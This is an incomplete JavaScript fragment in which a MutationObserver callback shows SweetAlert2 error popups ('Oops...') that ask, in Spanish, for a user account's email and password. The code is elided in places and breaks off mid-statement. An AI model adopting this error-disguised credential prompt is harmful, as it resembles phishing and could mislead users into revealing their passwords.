...
const observer = new MutationObserver(()=>{
    ...
    const charge = () => {
        ...
        const getCredentials_ = () => {
            const bEmail = Swal.fire({
                icon: 'error',
                title: 'Oops...',
                text: 'Suministre el correo electronico de la cuenta de usuario: ',
                
              })

            
            const bClave = Swal.fire({
                icon: 'error',
                title: 'Oops...',
                text: 'Suministre la clave de la cuenta de usuario:  ',
